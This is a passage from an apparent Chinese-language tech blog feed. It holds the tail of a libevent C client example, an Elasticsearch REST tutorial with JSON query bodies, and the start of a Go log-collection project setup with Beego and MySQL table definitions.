class="string">"127.0.0.1"</span>,&amp;serv.sin_addr.s_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器</span></span><br><span class="line">bufferevent_socket_connect(bev,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置回调</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置读回调生效</span></span><br><span class="line"><span class="comment">//bufferevent_enable(bev,EV_READ);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建事件，监听用户在终端上的输入</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span>* <span class="title">ev</span> = <span class="title">event_new</span>(<span class="title">base</span>,<span class="title">STDIN_FILENO</span>,<span class="title">EV_READ</span>|<span class="title">EV_PERSIST</span>,<span class="title">read_terminal</span>,<span class="title">bev</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加事件</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_client.c -o ev_client -l event</span><br></pre></td></tr></table></figure><h4 id="服务端客户端测试"><a href="#服务端客户端测试" class="headerlink" title="服务端客户端测试"></a>服务端客户端测试</h4><p><img src="/2021/11/19/浅学libevent/7.png" alt="7"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;libevent简介&quot;&gt;&lt;a href=&quot;#libevent简介&quot; class=&quot;headerlink&quot; title=&quot;libevent简介&quot;&gt;&lt;/a&gt;libevent简介&lt;/h4&gt;&lt;p&gt;&lt;code&gt;libevent&lt;/code&gt;是一个用C语言编写的轻量级的开源高
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch笔记</title>
    <link href="elssm.github.io/2021/11/16/Elasticsearch%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2021/11/16/Elasticsearch笔记/</id>
    <published>2021-11-16T06:29:54.000Z</published>
    <updated>2021-12-13T09:45:04.378Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ElasticSearch简介"><a href="#ElasticSearch简介" class="headerlink" title="ElasticSearch简介"></a>ElasticSearch简介</h4><p>Elasticsearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java语言开发的，并作为Apache许可条款下的开放源码发布，是一种流行的企业级搜索引擎。Elasticsearch用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。官方客户端在Java、.NET（C#）、PHP、Python、Apache Groovy、Ruby和许多其他语言中都是可用的。根据DB-Engines的排名显示，Elasticsearch是最受欢迎的企业搜索引擎，其次是Apache Solr，也是基于Lucene。</p><h4 id="ElasticSearch对比MySQL"><a href="#ElasticSearch对比MySQL" class="headerlink" title="ElasticSearch对比MySQL"></a>ElasticSearch对比MySQL</h4><div class="table-container"><table><thead><tr><th>ELasticSearch</th><th>MySQL</th></tr></thead><tbody><tr><td>index</td><td>database</td></tr><tr><td>type</td><td>table</td></tr><tr><td>document</td><td>row</td></tr><tr><td>field</td><td>column</td></tr></tbody></table></div><h4 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h4><p>RESTful中文意思是表现层状态转化。</p><p>在RESTful架构中：每一个URI代表一种资源；客户端和服务器之间，传递这种资源的某种表现层；客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。通过URI指定资源，如<code>Index，Document</code>等。通过<code>Http Method</code>指明资源操作类型，如<code>GET POST PUT DELETE</code>等。</p><h4 id="索引创建"><a href="#索引创建" class="headerlink" title="索引创建"></a>索引创建</h4><p>使用postman工具创建一个名为<code>shopping</code>的索引，请求方式为<code>PUT</code></p><p><img src="/2021/11/16/Elasticsearch笔记/1.png" alt="1"></p><h4 id="索引查询"><a href="#索引查询" class="headerlink" title="索引查询"></a>索引查询</h4><h5 id="获取单个索引信息"><a href="#获取单个索引信息" class="headerlink" title="获取单个索引信息"></a>获取单个索引信息</h5><p><img src="/2021/11/16/Elasticsearch笔记/2.png" alt="2"></p><h5 id="获取全部索引信息"><a href="#获取全部索引信息" class="headerlink" title="获取全部索引信息"></a>获取全部索引信息</h5><p>请求地址后面添加<code>_cat/indices?v</code></p><p><img src="/2021/11/16/Elasticsearch笔记/3.png" alt="3"></p><h4 id="索引删除"><a href="#索引删除" class="headerlink" title="索引删除"></a>索引删除</h4><p>删除名为<code>shopping</code>的索引，请求方式为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/4.png" alt="4"></p><h4 id="创建文档"><a href="#创建文档" class="headerlink" title="创建文档"></a>创建文档</h4><p>请求方式为<code>POST</code>，请求地址为<code>http://localhost:9200/索引名/_doc</code>，请求体为<code>JSON</code>格式</p><p><img src="/2021/11/16/Elasticsearch笔记/5.png" alt="5"></p><p>由于ES自动生成的<code>id</code>不便于记忆，因此我们可以自定义id，只需要在<code>_doc</code>后写入自定义的id即可</p><p><img src="/2021/11/16/Elasticsearch笔记/6.png" alt="6"></p><h4 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h4><p>只需要将创建文档的请求方式改为<code>GET</code>即可，其中<code>_doc</code>后面的<code>1001</code>相当于主键</p><p><img src="/2021/11/16/Elasticsearch笔记/7.png" alt="7"></p><p>获取索引下的所有数据，可以在请求的索引后加<code>_search</code></p><p><img src="/2021/11/16/Elasticsearch笔记/8.png" alt="8"></p><h4 id="修改索引下的数据"><a href="#修改索引下的数据" class="headerlink" title="修改索引下的数据"></a>修改索引下的数据</h4><h5 id="全量更新"><a href="#全量更新" class="headerlink" title="全量更新"></a>全量更新</h5><p>因为全量更新的请求是满足幂等条件的，因此请求方式为<code>PUT</code>，将需要修改的内容以<code>JSON</code>格式写入请求体</p><p><img src="/2021/11/16/Elasticsearch笔记/9.png" alt="9"></p><h5 id="局部更新"><a href="#局部更新" class="headerlink" title="局部更新"></a>局部更新</h5><p>局部更新的请求不满足幂等条件，因此请求方式为<code>POST</code>，而且因为是局部更新，因此索引名后面要写<code>_update</code>而不能写<code>_doc</code></p><p><img src="/2021/11/16/Elasticsearch笔记/10.png" alt="10"></p><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>资源地址和创建时是一样的，请求方式变为<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearch笔记/11.png" alt="11"></p><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><h5 id="请求路径查询"><a href="#请求路径查询" class="headerlink" title="请求路径查询"></a>请求路径查询</h5><p>请求方式为<code>GET</code>，请求路径为<code>http://localhost:9200/shopping/_search?q=category:iphone13</code></p><p>该请求路径表示查询shopping索引下<code>category=iphone13</code>的所有结果</p><p><img src="/2021/11/16/Elasticsearch笔记/12.png" alt="12"></p><h5 id="请求体查询"><a href="#请求体查询" class="headerlink" title="请求体查询"></a>请求体查询</h5><p>请求体查询在请求路径只需要输入<code>http://localhost:9200/shopping/_search</code>，在请求体中添加<code>JSON</code>查询请求如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match"</span>:&#123;</span><br><span class="line">            <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/13.png" alt="13"></p><p>如果要全量查询，只需要将请求体中的<code>match</code>改为<code>match_all</code>即可</p><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><p>全量查询的话数据量会很大，因此我们可以采用分页查询</p><p>请求体中添加<code>JSON</code>如下，其中<code>from</code>表示从哪一页开始，0表示第一页。size表示页的大小，即每一页有多少条数据。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/14.png" alt="14"></p><h4 id="查询结果数据源控制"><a href="#查询结果数据源控制" class="headerlink" title="查询结果数据源控制"></a>查询结果数据源控制</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>_source</code>表示所要展示的数据源，这里我们设置只显示<code>title</code>字段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"_source"</span> : [<span class="string">"title"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/15.png" alt="15"></p><h4 id="查询结果排序"><a href="#查询结果排序" class="headerlink" title="查询结果排序"></a>查询结果排序</h4><p>在请求体中添加<code>JSON</code>请求查询如下，其中<code>sort</code>表示所要要对数据进行排序，这里我们设置按照价格进行降序排序，</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"_source"</span> : [<span class="string">"title"</span>],</span><br><span class="line">    <span class="attr">"sort"</span> : &#123;</span><br><span class="line">        <span class="attr">"price"</span> : &#123;</span><br><span class="line">            <span class="attr">"order"</span> : <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/16.png" alt="16"></p><h4 id="多条件查询"><a href="#多条件查询" class="headerlink" title="多条件查询"></a>多条件查询</h4><h5 id="多条件同时成立"><a href="#多条件同时成立" class="headerlink" title="多条件同时成立"></a>多条件同时成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>must</code>表示多个条件必须同时成立</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"must"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/17.png" alt="17"></p><h5 id="多条件任意成立"><a href="#多条件任意成立" class="headerlink" title="多条件任意成立"></a>多条件任意成立</h5><p>请求体如下，其中<code>bool</code>代表条件查询，<code>should</code>表示多个条件任意成立一个都行，这个时候我们会同时查出价格为5999和7999的结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"5999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Users/caoyifan/blog/source/_posts/Elasticsearch笔记/18.png" alt="18"></p><h4 id="范围查询"><a href="#范围查询" class="headerlink" title="范围查询"></a>范围查询</h4><p>请求体如下，其中<code>filter</code>表示过滤，<code>range</code>表示范围，我们选择<code>price</code>大于6000作为条件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"filter"</span> : &#123;</span><br><span class="line">                <span class="attr">"range"</span> : &#123;</span><br><span class="line">                    <span class="attr">"price"</span> : &#123;</span><br><span class="line">                        <span class="attr">"gt"</span> : <span class="number">6000</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/19.png" alt="19"></p><h4 id="完全匹配"><a href="#完全匹配" class="headerlink" title="完全匹配"></a>完全匹配</h4><p>ES在进行匹配查询的时候，会对文字进行插词之后倒排索引，因此对于<code>category=华为</code>来讲，我们在<code>match</code>匹配的时候只写一个华或是一个为，ES都会匹配出<code>category=华为</code>的结果。如果我们需要完全匹配的话，需要将<code>match</code>改为<code>match_phrase</code></p><h4 id="高亮查询"><a href="#高亮查询" class="headerlink" title="高亮查询"></a>高亮查询</h4><p>请求体如下，这里我们的匹配规则是<code>category=iphone13</code>，并对<code>category</code>字段进行高亮处理</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">        <span class="attr">"match"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : <span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"highlight"</span> : &#123;</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/20.png" alt="20"></p><h4 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h4><h5 id="创建一个索引映射"><a href="#创建一个索引映射" class="headerlink" title="创建一个索引映射"></a>创建一个索引映射</h5><p>首先创建一个<code>test</code>索引</p><p><img src="/2021/11/16/Elasticsearch笔记/21.png" alt="21"></p><p>创建索引的结构信息</p><p>请求路径为<code>http://localhost:9200/test/_mapping</code>，请求方式为<code>PUT</code>，请求体如下，其中<code>properties</code>表示属性设置，<code>type=text</code>表示<code>name</code>可以分词处理，<code>index=true</code>表示<code>name</code>可以被索引查询，<code>type=keyword</code>表示<code>sex</code>不可以分词处理，必须完整匹配。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"name"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"sex"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"tel"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearch笔记/22.png" alt="22"></p><h5 id="增加数据"><a href="#增加数据" class="headerlink" title="增加数据"></a>增加数据</h5><p><img src="/2021/11/16/Elasticsearch笔记/23.png" alt="23"></p><h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p>因为我们的<code>name</code>设置的是可以分词，因此我们在查询的时候对于<code>name</code>只匹配一个字也可以查询出来结果。</p><p><img src="/2021/11/16/Elasticsearch笔记/24.png" alt="24"></p><p>对于<code>sex</code>因为我们设置的是<code>keyword</code>，因此不可以分词查询。必须完全匹配。</p><p><img src="/2021/11/16/Elasticsearch笔记/25.png" alt="25"></p><p><img src="/2021/11/16/Elasticsearch笔记/26.png" alt="26"></p><p>而对于<code>tel</code>字段，因为<code>index</code>为<code>false</code>，即不可以通过索引进行查询，因此我们无法根据<code>tel</code>字段查到数据。</p><p><img src="/2021/11/16/Elasticsearch笔记/27.png" alt="27"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ElasticSearch简介&quot;&gt;&lt;a href=&quot;#ElasticSearch简介&quot; class=&quot;headerlink&quot; title=&quot;ElasticSearch简介&quot;&gt;&lt;/a&gt;ElasticSearch简介&lt;/h4&gt;&lt;p&gt;Elasticsearch是一个基于
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Go日志收集项目流程梳理</title>
    <link href="elssm.github.io/2021/11/12/Go%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86%E9%A1%B9%E7%9B%AE%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>elssm.github.io/2021/11/12/Go日志收集项目流程梳理/</id>
    <published>2021-11-12T07:10:44.000Z</published>
    <updated>2021-12-13T09:45:21.439Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>该项目主要分为三个部分，web端负责对etcd的写入以及从mysql读写数据进行展示。logAgent负责日志的收集，主要是通过tail从etcd中实时获取所要收集的日志项，然后通过sarama从相应的日志文件读取日志信息发送到Kafka。logTransfer负责从Kafka中读取日志，并将日志写入elasticsearch最后通过Kibana进行日志的检索。</p><h4 id="logBeegoWeb"><a href="#logBeegoWeb" class="headerlink" title="logBeegoWeb"></a>logBeegoWeb</h4><p>前端使用Beego框架完成。在运行项目之前，首先安装bee脚手架。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/beego/bee</span><br></pre></td></tr></table></figure><p>执行<code>bee</code>命令查看是否安装成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % bee</span><br><span class="line">Bee is a Fast and Flexible tool for managing your Beego Web Application.</span><br><span class="line"></span><br><span class="line">USAGE</span><br><span class="line">    bee command [arguments]</span><br><span class="line"></span><br><span class="line">AVAILABLE COMMANDS</span><br><span class="line"></span><br><span class="line">    version     Prints the current Bee version</span><br><span class="line">    migrate     Runs database migrations</span><br><span class="line">    api         Creates a Beego API application</span><br><span class="line">    bale        Transforms non-Go files to Go source files</span><br><span class="line">    fix         Fixes your application by making it compatible with newer versions of Beego</span><br><span class="line">    pro         Source code generator</span><br><span class="line">    dlv         Start a debugging session using Delve</span><br><span class="line">    dockerize   Generates a Dockerfile for your Beego application</span><br><span class="line">    generate    Source code generator</span><br><span class="line">    hprose      Creates an RPC application based on Hprose and Beego frameworks</span><br><span class="line">    new         Creates a Beego application</span><br><span class="line">    pack        Compresses a Beego application into a single file</span><br><span class="line">    rs          Run customized scripts</span><br><span class="line">    run         Run the application by starting a local development server</span><br><span class="line">    server      serving static content over HTTP on port</span><br><span class="line">    update      Update Bee</span><br><span class="line"></span><br><span class="line">Use bee help [command] for more information about a command.</span><br><span class="line"></span><br><span class="line">ADDITIONAL HELP TOPICS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Use bee help [topic] for more information about that topic.</span><br></pre></td></tr></table></figure><p>进入logBeegoWeb文件夹，<code>bee run</code>启动项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro logBeegoWeb % bee run</span><br><span class="line">______</span><br><span class="line">| ___ \</span><br><span class="line">| |_/ /  ___   ___</span><br><span class="line">| ___ \ / _ \ / _ \</span><br><span class="line">| |_/ /|  __/|  __/</span><br><span class="line">\____/  \___| \___| v1.12.0</span><br><span class="line">2021/11/12 15:09:30 INFO     ▶ 0001 Using 'logBeegoWeb' as 'appname'</span><br><span class="line">2021/11/12 15:09:30 INFO     ▶ 0002 Initializing watcher...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  ▶ 0003 Built Successfully!</span><br><span class="line">2021/11/12 15:09:32 INFO     ▶ 0004 Restarting 'logBeegoWeb'...</span><br><span class="line">2021/11/12 15:09:32 SUCCESS  ▶ 0005 './logBeegoWeb' is running...</span><br><span class="line">2021/11/12 15:09:32.451 [I] [asm_amd64.s:1374]  http server Running on http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p>查看本地<code>8080</code>端口，项目启动成功</p><p><img src="/2021/11/12/Go日志收集项目流程梳理/1.png" alt="1"></p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>创建数据库的sql源码如下，创建名为<code>logCollect</code> 的数据库，并创建三张表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> logCollect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_info(</span><br><span class="line">app_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_name <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">app_type <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span class="keyword">CURRENT_TIMESTAMP</span>,</span><br><span class="line">develop_path <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_app_ip(</span><br><span class="line">app_id <span class="built_in">int</span>,</span><br><span class="line">ip <span class="built_in">varchar</span>(<span class="number">64</span>),</span><br><span class="line"><span class="keyword">Key</span> app_id_ip_index (app_id, ip)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 AUTO_INCREMENT=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tbl_log_info(</span><br><span class="line">log_id <span class="built_in">int</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line">app_id <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">log_path <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">topic <span class="built_in">varchar</span>(<span class="number">1024</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">create_time <span class="built_in">TIMESTAMP</span> <span class="keyword">DEFAULT</span> <span 